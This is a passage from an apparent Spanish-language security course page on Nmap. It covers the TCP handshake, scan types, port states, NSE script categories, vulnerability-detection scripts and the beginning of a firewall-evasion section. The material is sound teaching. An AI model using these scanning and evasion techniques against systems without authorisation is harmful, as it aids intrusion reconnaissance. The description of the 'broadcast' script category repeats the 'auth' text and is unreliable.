su n\u00famero de secuencia.</p> <ol> <li>SYN-ACK (Sincronizaci\u00f3n y reconocimiento):<ul> <li>El servidor recibe el mensaje SYN del cliente y responde con un segmento que tiene dos flags activados: SYN y ACK.</li> <li>El SYN indica que el servidor tambi\u00e9n quiere sincronizar la conexi\u00f3n, y el ACK es para confirmar que recibi\u00f3 correctamente el SYN del cliente.</li> <li>El servidor env\u00eda su propio n\u00famero de secuencia (<code>seq = y</code>) y reconoce el n\u00famero de secuencia del cliente con un acknowledgment number (por ejemplo, <code>ack = x + 1</code>).</li> </ul> </li> </ol> <p>Prop\u00f3sito: El servidor confirma que recibi\u00f3 la solicitud del cliente y env\u00eda su propio n\u00famero de secuencia para la sincronizaci\u00f3n.</p> <ol> <li>ACK (Confirmaci\u00f3n del cliente):<ul> <li>El cliente recibe el segmento SYN-ACK del servidor y responde con un segmento ACK.</li> <li>Este segmento contiene el acknowledgment number (<code>ack = y + 1</code>), que confirma que recibi\u00f3 el n\u00famero de secuencia del servidor.</li> </ul> </li> </ol> <p>Prop\u00f3sito: El cliente confirma que ha recibido el SYN del servidor, y la conexi\u00f3n se establece.</p> <p>Una vez que el 3-way handshake se ha completado, la conexi\u00f3n est\u00e1 completamente establecida y se pueden intercambiar datos de manera confiable.</p>"},{"location":"segof/nmap101/#explicacion-grafica","title":"Explicaci\u00f3n gr\u00e1fica","text":"<p>A continuaci\u00f3n te describo c\u00f3mo se ver\u00edan las tres fases del 3-way handshake. Aunque no puedo insertar im\u00e1genes directamente, te puedo describir c\u00f3mo podr\u00edas visualizarlo:</p>"},{"location":"segof/nmap101/#paso-1-cliente-envia-syn","title":"Paso 1: Cliente env\u00eda SYN","text":"<p><pre><code>Cliente                       Servidor\n   |                              |\n   | --- [SYN, seq = x] ---&gt;      |\n   |                              |\n</code></pre> - El cliente env\u00eda un paquete SYN con el n\u00famero de secuencia <code>x</code>.</p>"},{"location":"segof/nmap101/#paso-2-servidor-responde-con-syn-ack","title":"Paso 2: Servidor responde con SYN-ACK","text":"<p><pre><code>Cliente                                    Servidor\n   |                                           |\n   | --- [SYN, seq = x] ---&gt;                   |\n   |                                           |\n   | &lt;--- [SYN, ACK, seq = y, ack = x + 1] --- |\n   |                                           |\n</code></pre> - El servidor responde con un SYN y ACK, reconociendo el n\u00famero de secuencia del cliente (con <code>ack = x + 1</code>) y enviando su propio n\u00famero de secuencia (<code>seq = y</code>).</p>"},{"location":"segof/nmap101/#paso-3-cliente-responde-con-ack","title":"Paso 3: Cliente responde con ACK","text":"<p><pre><code>Cliente                                     Servidor\n   |                                            |\n   | --- [SYN, seq = x] ---&gt;                    |\n   |                                            |\n   | &lt;--- [SYN, ACK, seq = y, ack = x + 1] ---  |\n   |                                            |\n   | --- [ACK, ack = y + 1] ---&gt;                |\n   |                                            |\n</code></pre> - El cliente env\u00eda el \u00faltimo paquete, un ACK que confirma el n\u00famero de secuencia del servidor (<code>ack = y + 1</code>).</p> <p>Con esto, la conexi\u00f3n TCP est\u00e1 establecida y lista para transmitir datos.</p>"},{"location":"segof/nmap101/#resumen","title":"Resumen","text":"<ol> <li>SYN: El cliente dice \"Quiero iniciar una conexi\u00f3n, este es mi n\u00famero de secuencia.\"</li> <li>SYN-ACK: El servidor responde \"Confirmo que recib\u00ed tu solicitud, aqu\u00ed est\u00e1 mi n\u00famero de secuencia.\"</li> <li>ACK: El cliente responde \"He recibido tu n\u00famero de secuencia, comencemos a enviar datos.\"</li> </ol>"},{"location":"segof/nmap101/#concepto-clave","title":"Concepto clave","text":"<ul> <li>El intercambio de n\u00fameros de secuencia y acknowledgments (confirmaciones) asegura que ambos lados saben qu\u00e9 datos han sido enviados y recibidos, permitiendo que la transmisi\u00f3n de informaci\u00f3n sea confiable y ordenada. </li> </ul>"},{"location":"segof/nmap101/#uso-de-nmap","title":"Uso de Nmap","text":"<p>Podemos ver la infinidad de opciones que nos ofrece Nmap simplemente escribiendo <code>$ nmap</code> en el terminal:</p> <p></p> <p>Existen un sinf\u00edn de t\u00e9cnicas y algoritmos de escaneo en Nmap, as\u00ed como otras tantas opciones a aplicar a estos escaneos. Es imposible cubrirlo todo en este curso por lo que s\u00f3lo nombraremos los aspectos m\u00e1s importantes y queda a discrecci\u00f3n del alumno profundizar m\u00e1s.</p> <p>Output completo:</p> <pre><code>Nmap 5.61TEST5 ( https://nmap.org )\nUsage: nmap [Scan Type(s)] [Options] {target specification}\nTARGET SPECIFICATION:\n  Can pass hostnames, IP addresses, networks, etc.\n  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254\n  -iL : Input from list of hosts/networks\n  -iR : Choose random targets\n  --exclude : Exclude hosts/networks\n  --excludefile : Exclude list from file\nHOST DISCOVERY:\n  -sL: List Scan - simply list targets to scan\n  -sn: Ping Scan - disable port scan\n  -Pn: Treat all hosts as online -- skip host discovery\n  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports\n  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes\n  -PO[protocol list]: IP Protocol Ping\n  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]\n--dns-servers : Specify custom DNS servers\n  --system-dns: Use OS's DNS resolver\n  --traceroute: Trace hop path to each host\nSCAN TECHNIQUES:\n  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans\n  -sU: UDP Scan\n  -sN/sF/sX: TCP Null, FIN, and Xmas scans\n  --scanflags : Customize TCP scan flags\n  -sI : Idle scan\n  -sY/sZ: SCTP INIT/COOKIE-ECHO scans\n  -sO: IP protocol scan\n  -b : FTP bounce scan\nPORT SPECIFICATION AND SCAN ORDER:\n  -p : Only scan specified ports\n    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9\n  -F: Fast mode - Scan fewer ports than the default scan\n  -r: Scan ports consecutively - don't randomize\n  --top-ports : Scan  most common ports\n  --port-ratio : Scan ports more common than \nSERVICE/VERSION DETECTION:\n  -sV: Probe open ports to determine service/version info\n  --version-intensity : Set from 0 (light) to 9 (try all probes)\n--version-light: Limit to most likely probes (intensity 2)\n--version-all: Try every single probe (intensity 9)\n--version-trace: Show detailed version scan activity (for debugging)\nSCRIPT SCAN:\n  -sC: equivalent to --script=default\n  --script=:  is a comma separated list of\n           directories, script-files or script-categories\n  --script-args=: provide arguments to scripts\n  --script-args-file=filename: provide NSE script args in a file\n  --script-trace: Show all data sent and received\n  --script-updatedb: Update the script database.\n  --script-help=: Show help about scripts.\n            is a comma separted list of script-files or\n           script-categories.\nOS DETECTION:\n  -O: Enable OS detection\n  --osscan-limit: Limit OS detection to promising targets\n  --osscan-guess: Guess OS more aggressively\nTIMING AND PERFORMANCE:\n  Options which take  are in seconds, or append 'ms' (milliseconds),\n  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).\n  -T&lt;0-5&gt;: Set timing template (higher is faster)\n--min-hostgroup/max-hostgroup : Parallel host scan group sizes\n  --min-parallelism/max-parallelism : Probe parallelization\n  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies\n      probe round trip time.\n  --max-retries : Caps number of port scan probe retransmissions.\n  --host-timeout : Give up on target after this long\n  --scan-delay/--max-scan-delay : Adjust delay between probes\n  --min-rate : Send packets no slower than  per second\n  --max-rate : Send packets no faster than  per second\nFIREWALL/IDS EVASION AND SPOOFING:\n  -f; --mtu : fragment packets (optionally w/given MTU)\n-D : Cloak a scan with decoys\n  -S : Spoof source address\n  -e : Use specified interface\n  -g/--source-port : Use given port number\n  --data-length : Append random data to sent packets\n  --ip-options : Send packets with specified ip options\n  --ttl : Set IP time-to-live field\n  --spoof-mac : Spoof your MAC address\n  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum\nOUTPUT:\n  -oN/-oX/-oS/-oG : Output scan in normal, XML, s|: Output in the three major formats at once\n  -v: Increase verbosity level (use -vv or more for greater effect)\n-d: Increase debugging level (use -dd or more for greater effect)\n--reason: Display the reason a port is in a particular state\n  --open: Only show open (or possibly open) ports\n  --packet-trace: Show all packets sent and received\n  --iflist: Print host interfaces and routes (for debugging)\n--log-errors: Log errors/warnings to the normal-format output file\n  --append-output: Append to rather than clobber specified output files\n  --resume : Resume an aborted scan\n  --stylesheet : XSL stylesheet to transform XML output to HTML\n  --webxml: Reference stylesheet from Nmap.Org for more portable XML\n  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output\nMISC:\n  -6: Enable IPv6 scanning\n  -A: Enable OS detection, version detection, script scanning, and traceroute\n  --datadir : Specify custom Nmap data file location\n  --send-eth/--send-ip: Send using raw ethernet frames or IP packets\n  --privileged: Assume that the user is fully privileged\n  --unprivileged: Assume the user lacks raw socket privileges\n  -V: Print version number\n  -h: Print this help summary page.\nEXAMPLES:\n  nmap -v -A scanme.nmap.org\n  nmap -v -sn 192.168.0.0/16 10.0.0.0/8\n  nmap -v -iR 10000 -Pn -p 80\nSEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES\n</code></pre>"},{"location":"segof/nmap101/#tipos-de-escaneos","title":"Tipos de escaneos","text":""},{"location":"segof/nmap101/#antes-de-nada-recordatorio-del-3-way-handshake","title":"Antes de nada: recordatorio del 3-way-handshake","text":"<p>Primero, un poco de antecedentes. Durante la comunicaci\u00f3n con un servicio TCP, se establece una \u00fanica conexi\u00f3n con el protocolo de enlace de 3 v\u00edas de TCP. Esto implica un <code>SYN</code> enviado a un puerto abierto TCP que tiene un servicio vinculado a \u00e9l, ejemplos t\u00edpicos son HTTP (puerto 80), SMTP (puerto 25), POP3 (puerto 110) o SSH (puerto 22).</p> <p>En el lado del servidor ser ver\u00e1 un <code>SYN</code> y se responder\u00e1 con <code>SYN ACK</code>, y el cliente responder\u00e1 <code>SYN ACK</code> con un <code>ACK</code>. Esto completa la configuraci\u00f3n y ahora se puede realizar el intercambio de datos.</p> <p></p> <p>En este ejemplo, el firewall pasa el tr\u00e1fico al servidor web (HTTP -&gt; 80) y el servidor web responde con el acuse de recibo.</p> <p>En todos estos ejemplos, un firewall podr\u00eda ser un dispositivo de hardware independiente o podr\u00eda ser un firewall de software local en la computadora host.</p>"},{"location":"segof/nmap101/#escaneo-tcp-syn-ss","title":"Escaneo TCP SYN (-sS)","text":"<p>El an\u00e1lisis SYN es la opci\u00f3n de an\u00e1lisis predeterminada y m\u00e1s popular, por buenas razones. Se puede realizar r\u00e1pidamente, escaneando miles de puertos por segundo en una red r\u00e1pida no obstaculizada por firewalls restrictivos.</p> <p>Tambi\u00e9n es relativamente discreto y sigiloso, ya que nunca completa las conexiones TCP.</p> <p>Caracter\u00edsticas:</p> <ul> <li>R\u00e1pido</li> <li>Relativamente sigiloso</li> <li>Requiere privilegios </li> </ul> <pre><code>$nmap -sS objetivo\n</code></pre>"},{"location":"segof/nmap101/#escaneo-tcp-connect-st","title":"Escaneo TCP connect (-sT)","text":"<p>El escaneo de conexi\u00f3n TCP es el tipo de escaneo TCP predeterminado cuando el escaneo SYN no es una opci\u00f3n. Este es el caso cuando un usuario no tiene privilegios para fabricar mensajes a medida con los flags necesarios.</p> <p>En lugar de escribir paquetes sin procesar como hacen la mayor\u00eda de los otros tipos de escaneo, Nmap le pide al sistema operativo subyacente que establezca una conexi\u00f3n con la m\u00e1quina y el puerto de destino emitiendo la llamada al sistema de conexi\u00f3n.</p> <p><pre><code>$nmap -sT objetivo\n</code></pre> Caracter\u00edsticas: </p> <ul> <li>Conf\u00eda en el sistema operativo</li> <li>M\u00e1s lento que TCP-SYN-Scan</li> </ul>"},{"location":"segof/nmap101/#escaneos-udp-su","title":"Escaneos UDP (-sU)","text":"<p>Si bien los servicios m\u00e1s populares en Internet se ejecutan sobre el protocolo TCP, los servicios UDP se implementan ampliamente. DNS, SNMP y DHCP (puertos registrados 53, 161/162 y 67/68) son tres de los m\u00e1s comunes. </p> <p>Debido a que el escaneo UDP es generalmente m\u00e1s lento y m\u00e1s dif\u00edcil que TCP, algunos auditores de seguridad ignoran estos puertos. Esto es un error, ya que los servicios UDP explotables son bastante comunes y los atacantes ciertamente no ignoran todo el protocolo.</p> <p><pre><code>$nmap -sU objetivo\n</code></pre> Caracter\u00edsticas:</p> <ul> <li>Lento</li> <li>Poco fiable</li> </ul>"},{"location":"segof/nmap101/#tcp-null-scan-sn","title":"TCP Null scan (-sN)","text":"<p>En los TCP Null Scans, los paquetes TCP enviados no tienen ninguna de las flags TCP establecidas.</p> <p>Seg\u00fan el RFC, ante tal circunstancia, el objetivo debe responder con un RST si el puerto est\u00e1 cerrado</p> <pre><code>$nmap -sN objetivo\n</code></pre>"},{"location":"segof/nmap101/#tcp-fin-scan-sf","title":"TCP FIN scan (-sF)","text":"<p>Esto es muy similar al anterior, excepto por el hecho de que en lugar de enviar un paquete TCP completamente vac\u00edo, env\u00eda un paquete con el flag FIN establecido que se usa para cerrar una conexi\u00f3n ordenadamente.</p> <p>En consecuencia, el objetivo debe responder con un RST para puertos cerrados seg\u00fan RFC.</p> <pre><code>$nmap -sF objetivo\n</code></pre>"},{"location":"segof/nmap101/#tcp-xmas-scan-sx","title":"TCP Xmas scan (-sX)","text":"<p>TCP Xmas Scans tambi\u00e9n es muy similar a las dos \u00faltimas t\u00e9cnicas de escaneo, excepto por el hecho de que utilizan paquetes TCP con los flags PSH, URG y FIN configurados.</p> <p>Como los dos \u00faltimos tipos de escaneo, esto tambi\u00e9n espera paquetes RST para puertos cerrados bajo RFC.</p> <pre><code>$nmap -sX objetivo\n</code></pre>"},{"location":"segof/nmap101/#estados-de-los-puertos-escaneados","title":"Estados de los puertos escaneados","text":"<p>Tras realizar el escaneo de puertos, se nos pueden reportar cuatro posibles estados de los mismos:</p> <ul> <li> <p>open: El puerto responde activamente a las conexiones entrantes</p> </li> <li> <p>open | filtered: cuando no se recibe respuesta, el puerto se clasifica as\u00ed porque \"ninguna respuesta\" puede significar s\u00f3lo dos cosas:</p> <ul> <li>El puerto esta abierto (en algunos tipos de escaneos no se recibe respuesta al SYN)</li> <li>El puerto est\u00e1 protegido detr\u00e1s de un firewall, por lo que se filtra</li> </ul> </li> <li> <p>filtered: cuando el puerto est\u00e1 protegido detr\u00e1s de un firewall que env\u00eda un ping ICMP de vuelta </p> </li> <li> <p>closed: cuando se recibe un paquete RST</p> </li> </ul>"},{"location":"segof/nmap101/#puertos-filtrados-o-bloqueados","title":"Puertos filtrados o bloqueados","text":"<p>El trabajo de un firewall es proteger un sistema de paquetes no deseados que podr\u00edan da\u00f1arlo. En este ejemplo simple, el escaneo de puertos se realiza en el puerto 81, ya que no hay ning\u00fan servicio ejecut\u00e1ndose en este puerto, por lo que la mejor pr\u00e1ctica es usar un firewall para bloquear el acceso.</p> <p>Un <code>filtered</code> port como resultado de Nmap indica que el puerto no ha respondido en absoluto. El SYN simplemente ha sido descartado por el firewall. </p> <p></p>"},{"location":"segof/nmap101/#puertos-cerrados-o-cuando-falla-el-firewall","title":"Puertos cerrados o cuando falla el Firewall","text":"<p>En este caso, el resultado <code>closed</code> m\u00e1s com\u00fan indica que no hay ning\u00fan servicio ejecut\u00e1ndose en el puerto, pero el firewall ha permitido que la conexi\u00f3n pase al servidor. Tambi\u00e9n puede significar que no hay ning\u00fan firewall presente.</p> <p>Se debe tener en cuenta que aunque se presentan los escenarios m\u00e1s comunes, es posible configurar un firewall para rechazar paquetes en lugar de descartarlos. Esto significar\u00eda que los paquetes que lleguen al firewall se ver\u00e1n cerrados (el firewall responde con RST ACK).</p> <p>A continuaci\u00f3n se muestra un caso en el que una regla de firewall permite el paso del paquete en el puerto 81 aunque no haya ning\u00fan servicio escuchando en el puerto. Lo m\u00e1s probable es que esto se deba a que el firewall est\u00e1 mal configurado.</p> <p></p>"},{"location":"segof/nmap101/#puertos-abiertos","title":"Puertos abiertos","text":"<p>Cuando de alg\u00fan puerto se indica el resultado <code>Open</code> en principio se trata de alg\u00fan servicio expuesto al p\u00fablico que est\u00e1 accesible.</p> <p>Un detalle interesante a notar es el <code>RST</code>  enviado despu\u00e9s de aceptar el <code>SYN ACK</code> desde el servidor web. El <code>RST</code> es enviado por Nmap ya que el estado del puerto (abierto) ha sido determinado por el <code>SYN ACK</code>. Si estuvi\u00e9ramos buscando m\u00e1s informaci\u00f3n como la versi\u00f3n del servicio HTTP o para obtener la p\u00e1gina, el RST no se enviar\u00eda. Se establecer\u00eda una conexi\u00f3n completa.</p> <p></p>"},{"location":"segof/nmap101/#opciones-para-los-escaneos-switches-de-nmap","title":"Opciones para los escaneos (switches de Nmap)","text":"<p>Es imposible comentar todas las opciones que se pueden usar con Nmap, pero algunas de las m\u00e1s notorias ser\u00edan:</p> <ul> <li><code>-T(0-5)</code>:  Esta es una opci\u00f3n para establecer la velocidad del escaneo. Los n\u00fameros van de 0 a 5, donde 5 es el m\u00e1s r\u00e1pido y 0 es el m\u00e1s lento.</li> </ul> <p></p> <ul> <li> <p><code>-A</code>: Esta opci\u00f3n hace que Nmap se esfuerce en identificar el sistema operativo, los servicios y las versiones de destino. Tambi\u00e9n hace traceroute y aplica scripts NSE para detectar informaci\u00f3n adicional. Este es un escaneo bastante ruidoso ya que aplica muchos escaneos diferentes. Los scripts NSE aplicados son los de la configuraci\u00f3n por defecto.</p> </li> <li> <p><code>-v</code>: Mayor detalle. Esto nos dar\u00e1 informaci\u00f3n adicional en los datos generados por Nmap.</p> </li> <li> <p><code>-sV</code>: Se utiliza para sondear activamente los puertos abiertos para intentar determinar qu\u00e9 servicio y versi\u00f3n est\u00e1n ejecutando. </p> </li> <li> <p><code>-p</code>: Lista separada por comas de los puertos que se desean analizar. Una forma sencilla de definir solo unos pocos puertos para escanear o aumentar el alcance del escaneo a, por ejemplo, todos los puertos TCP disponibles.</p> </li> <li> <p><code>-O</code>: Hacer que Nmap intente decidir qu\u00e9 tipo de sistema operativo es. El proceso de detecci\u00f3n del sistema operativo puede ser bastante complejo, pero tambi\u00e9n bastante simple. Un factor simple para intentar decidir si se trata de un sistema operativo Windows o Unix es mirar el campo TTL (Tiempo de vida) en los paquetes que se env\u00edan desde el sistema operativo. Por lo general, Windows tiene un valor predeterminado de 128, mientras que Unix tiene un valor predeterminado de 64.</p> </li> <li> <p><code>-Pn</code>: Fuerza la suposici\u00f3n de que el host est\u00e1 activo, omitiendo as\u00ed la fase de descubrimiento del host.</p> </li> <li> <p><code>-oA</code>: Guarda el resultado de salida de Nmap en formatos \"normal\", XML y grepable. No obstante, se puede concretar de forma espec\u00edfica el formato del archivo de salida:</p> <ul> <li> <p><code>-oN</code>: redirige la salida normal a un nombre de archivo determinado</p> </li> <li> <p><code>-oX</code>: Produce resultados en un formato XML limpio y gu\u00e1rdalos en un archivo determinado.</p> </li> <li> <p><code>-oG</code>: Produce una salida \"grepable\" y la almacena en un archivo. Formato obsoleto ya que los usuarios ahora se est\u00e1n moviendo hacia salidas XML.</p> </li> </ul> </li> </ul>"},{"location":"segof/nmap101/#scripts-en-nmap","title":"Scripts en Nmap","text":"<p>Nmap incorpora un potente sistema de scripts conocido como NSE (Nmap Scripting Engine) que permite a los usuarios extender las capacidades de Nmap usando los diversos scripts que incorpora (actualmente hay m\u00e1s de 500 disponibles) que permiten desde la detecci\u00f3n avanzada de versiones a la explotaci\u00f3n de vulnerabilidades, o creando nuevos scripts que podemos compartir con el resto de usuarios (para los script se utiliza el lenguaje de programaci\u00f3n LUA).</p> <p>Para habilitar el uso de script en Nmap usamos la opci\u00f3n <code>-sC (nmap -sC &lt;objetivo&gt;)</code>. Con esta opci\u00f3n se seleccionar\u00e1n todos los scripts NSE que pertenecen a la categor\u00eda predeterminada (default) y se ejecutar\u00e1n contra los objetivos que indiquemos en el comando, por ejemplo:</p> <p><pre><code>$ nmap -sC scanme.nmap.org\n</code></pre> En este caso le estamos indicando que habilite el uso de scripts de la categor\u00eda predeterminada y Nmap selecciona los script a usar teniendo en cuenta los puertos que encuentra. En este caso se ejecutan los scripts <code>ssh-hostkey</code> y <code>http-title</code> como podemos ver en los resultados reportados:</p> <pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-22 13:01 CET\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.26s latency).\nOther addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n| ssh-hostkey: |   1024 ac:00:a0:1a:82:ff:cc:55:99:dc:67:2b:34:97:6b:75 (DSA)\n|   2048 20:3d:2d:44:62:2a:b0:5a:9d:b5:b3:05:14:c2:a6:b2 (RSA)\n|   256 96:02:bb:5e:57:54:1c:4e:45:2f:56:4c:4a:24:b2:57 (ECDSA)\n|_  256 33:fa:91:0f:e0:e1:7b:1f:6d:05:a2:b0:f1:54:41:56 (ED25519)\n80/tcp    open  http\n|_http-title: Go ahead and ScanMe!\n9929/tcp  open  nping-echo\n31337/tcp open  Elite\n\nNmap done: 1 IP address (1 host up) scanned in 11.64 seconds\n</code></pre> <p>Los scripts en NSE se dividen en las siguientes categor\u00edas:</p> <ul> <li> <p><code>auth</code>: Este tipo de Scripts permiten determinar credenciales de autenticaci\u00f3n en el sistema objetivo, frecuentemente realizando ataques de fuerza bruta sencillos, algunos ejemplos de este tipo de scripts son ftp-anon, snmp-brute, http-auth, etc.</p> </li> <li> <p><code>broadcast</code>: Este tipo de Scripts permiten determinar credenciales de autenticaci\u00f3n en el sistema objetivo, frecuentemente realizando ataques de fuerza bruta sencillos, algunos ejemplos de este tipo de scripts son ftp-anon, snmp-brute, http-auth, etc.</p> </li> <li> <p><code>brute</code>: esta categor\u00eda es para scripts que utilizan el sistema de fuerza bruta para averiguar las credenciales de usuario en un determinado servicio</p> </li> <li> <p><code>default</code>: estos son los scripts que se ejecutan cuando se ejecuta la opci\u00f3n -sC. Se trata de un conjunto de scripts que ejecutan operaciones concretas tratando de capturar la mayor cantidad de informaci\u00f3n contra un objetivo, se trata de una categor\u00eda que debe ser evitada, ya que puede hacer mucho ruido contra un sistema remoto que tenga un IDS/IPS instalado, utilizando esta categor\u00eda, probablemente el escaneo no sea tan discreto como se espera.</p> </li> <li> <p><code>discovery</code>: Estos scripts tratan de descubrir de forma activa servicios en el segmento de red tales como registros p\u00fablicos, dispositivos SNMP, servicios de directorio, etc.</p> </li> <li> <p><code>dos</code>: Intentan causar denegaci\u00f3n de servicio sobre un servicio determinado.</p> </li> <li> <p><code>exploit</code>: Tratan de detectar y explotar alg\u00fan tipo de vulnerabilidad sobre el objetivo.</p> </li> <li> <p><code>external</code>: Registran la informaci\u00f3n de un escaneo determinado en un recurso externo como por ejemplo un servicio de almacenamiento en internet, sin embargo es necesario ser cauteloso con este tipo de scripts ya que pueden enviar a una fuente externa la direcci\u00f3n IP del objetivo y del atacante.</p> </li> <li> <p><code>fuzzer</code>: Estos Scripts env\u00edan informaci\u00f3n al servidor que es inesperada, incompleta o aleatoria, con el fin de detectar una posible vulnerabilidad en el servicio, sin embargo es costoso en t\u00e9rminos de rendimiento del escaneo.</p> </li> <li> <p><code>intrusive</code>: Son Scripts con un alto grado de ser perjudiciales para el sistema objetivo, ya que intenta utilizar recursos del sistema objetivo tales como proxys HTTP o dispositivos con SNMP habilitado.</p> </li> <li> <p><code>malware</code>: Intentan determinar si el objetivo se encuentra infectado con malware o backdoors, algunos ejemplos de esta categor\u00eda de Scripts son: <code>smtp-strangeport</code> y <code>auth-spoof</code></p> </li> <li> <p><code>safe</code>: Est\u00e1n dise\u00f1ados para no afectar ni da\u00f1ar el objetivo, simplemente tratan de capturar informaci\u00f3n que pueda ser sensible sin afectar el rendimiento u otros factores de la ejecuci\u00f3n del servicio, ejemplos de este tipo de scripts pueden ser: ssh-hostkey o html-title </p> </li> <li> <p><code>version</code>: Se trata de scripts que extienden el proceso de detecci\u00f3n de versiones de servicios, est\u00e1n dise\u00f1ados para ejecutarse solamente si el escaneo tiene la opci\u00f3n (Scan Version -sV)</p> </li> <li> <p><code>vuln</code>: Chequean vulnerabilidades especificas de software y generan resultados solamente si dichas vulnerabilidades son encontradas, ejemplos de este tipo de scripts son: <code>realvnc-auth-bypass</code> y <code>afp-path-vuln</code></p> </li> </ul> <p>Si la instalaci\u00f3n de Nmap se ha realizado desde apt-get o dpkg, probablemente la ubicaci\u00f3n de todos los scripts se encuentre en <code>/usr/share/nmap/scripts</code></p>"},{"location":"segof/nmap101/#seleccion-de-scripts","title":"Selecci\u00f3n de scripts","text":"<p>Podemos seleccionar el script que queremos ejecutar directamente indicando el fichero o podemos seleccionar todos los de una categor\u00eda o categor\u00edas.</p>"},{"location":"segof/nmap101/#seleccionar-categorias","title":"Seleccionar categor\u00edas","text":"<pre><code>nmap -sV --script &lt;categoria&gt; &lt;objetivo&gt;\n</code></pre> <p>Por ejemplo:</p> <pre><code>nmap -sV --script version scanme.nmap.org\n</code></pre> <p>Ejecutamos los script de la categor\u00eda version contra el objetivo scanme.nmap.org:</p> <pre><code>nmap -sV --script=\"version,discovery\" scanme.nmap.org\n</code></pre> <p>Adem\u00e1s de los script de la categor\u00eda version tambi\u00e9n se usar\u00e1n los de la categor\u00eda discovery.</p> <pre><code>nmap -sV --script \"not intrusive\" scanme.nmap.org\n</code></pre> <p>En este caso se ejecutar\u00edan todos los script excepto los de la categor\u00eda intrusive.</p> <pre><code>nmap -sV --script \"(http-*) and not http-brute\" scanme.nmap.org\n</code></pre> <p>En este caso se ejecutar\u00edan todos los script http excepto http-brute.</p>"},{"location":"segof/nmap101/#seleccion-de-script-especifico","title":"Selecci\u00f3n de script espec\u00edfico","text":"<pre><code>nmap --script &lt;nombre de fichero&gt; &lt;objetivo&gt;\n</code></pre> <p>Por ejemplo:</p> <pre><code>nmap --script http-title scanme.nmap.org\n</code></pre> <p>Se ejecucuta el script http-title contra el objetivo scanme.nmap.org (es posible indicar varios scripts separandolos por comas).</p>"},{"location":"segof/nmap101/#actualizar-la-base-de-datos-de-scripts","title":"Actualizar la base de datos de scripts","text":"<pre><code>sudo nmap --script-updatedb\n</code></pre> <p>Se actualizar\u00e1n los script contra la base de datos de Nmap y los script nuevos se guardaran en la ruta por defecto de nuestra instalaci\u00f3n.</p>"},{"location":"segof/nmap101/#demostracion-de-algunos-scripts","title":"Demostraci\u00f3n de algunos scripts","text":"<ol> <li> <p>Comprobar las versiones de los servicios en los puertos abiertos</p> <p></p> </li> <li> <p>A continuaci\u00f3n se utiliza el script <code>ftp-anon</code> de la categor\u00eda <code>auth</code>. Este script nos permitir\u00e1 saber si el acceso an\u00f3nimo al servidor ftp est\u00e1 permitido.</p> <p></p> </li> <li> <p>Con el script <code>http-defaults-accounts</code> se intenta determinar si el acceso con credenciales por defecto est\u00e1 habilitado en algunas aplicaciones web.</p> <p></p> </li> <li> <p>El script <code>ftp-vsftpd-backdoor</code> corresponde a las categor\u00edas: exploit, intrusive, malware, vuln; este script busca la existencia de la puerta trasera (backdoor) reportada en CVE-2011-2523 (una vulnerabilidad antigua pero con fines ilustrativos)</p> <p></p> </li> <li> <p>Utilizando los scripts de la categor\u00eda <code>vuln</code> para descubrir la vlnerabilidad MS17-010 (Eternalblue), la que utiliz\u00f3 Wannacry en su d\u00eda.</p> <p></p> <p>Para haber buscado vulnerabilidad espec\u00edficas de SMB, pod\u00edamos haber utilizado tambi\u00e9n:</p> <pre><code>nmap -sV --script smb* &lt;Objetivo&gt;\n</code></pre> </li> </ol>"},{"location":"segof/nmap101/#evasion-de-firewall-con-nmap","title":"Evasi\u00f3n de firewall con Nmap","text":"<p>Como ya hemos visto, Nmap permite escaneos con diferentes par\u00e1metros del protocolo TCP, un peque\u00f1o resumen que tendremos en cuenta para esta secci\u00f3n es:</p> Escaneo Flags TCP Tama\u00f1o (Bytes) TTL -sT SYN 60 64 -sS (Stealth) SYN 44 &lt;64 -sF (Fin) FIN 40 &lt;64 -sN (Null) NULL 40 &lt;64 -sX (Xmas) FIN, PSH, URG 40 &lt;64"},{"location":"segof/nmap101/#que-es-un-firewall-o-cortafuegos","title":"\u00bfQu\u00e9 es un firewall o cortafuegos?","text":"<p>Un cortafuegos es una medida de seguridad contra intentos de conexi\u00f3n no autorizados desde redes externas. Todo sistema de seguridad de cortafuegos se basa en un componente de software que supervisa el tr\u00e1fico de red entre el cortafuegos y las conexiones de datos entrantes y decide c\u00f3mo gestionar la conexi\u00f3n en funci\u00f3n de las reglas establecidas.</p> <p>Comprueba si los paquetes de red individuales se pasan, se ignoran o se bloquean. Este mecanismo est\u00e1 dise\u00f1ado para evitar conexiones no deseadas que podr\u00edan ser  potencialmente peligrosas.</p>"},{"location":"segof/nmap101/#determinar-los-cortafuegos-y-sus-reglas","title":"Determinar los cortafuegos y sus reglas","text":"<p>Ya sabemos que cuando un puerto aparece como filtrado, puede deberse a varias razones. En la mayor\u00eda de los casos, los cortafuegos tienen ciertas reglas establecidas para manejar conexiones espec\u00edficas. Los paquetes pueden ser descartados o rechazados. Los paquetes rechazados son ignorados y no se devuelve ninguna respuesta desde el host.</p> <p>Esto es diferente para los paquetes rechazados que se devuelven con una bandera RST. Estos paquetes contienen diferentes tipos de c\u00f3digos de error ICMP o no contienen nada en absoluto.</p> <p>Tales errores pueden ser:</p> <ul> <li>Net Unreachable</li> <li>Net Prohibited</li> <li>Host Unreachable</li> <li>Host Prohibited</li> <li>Port Unreachable</li> <li>Proto Unreachable</li> </ul> <p>El m\u00e9todo de sondeo TCP ACK (-sA) de Nmap es mucho m\u00e1s dif\u00edcil de filtrar para los cortafuegos y sistemas IDS/IPS que los sondeos regulares SYN (-sS) o Connect (-sT) porque s\u00f3lo env\u00edan un paquete TCP con la bandera ACK. </p> <p>Cuando un puerto est\u00e1 cerrado o abierto, el host debe responder con una 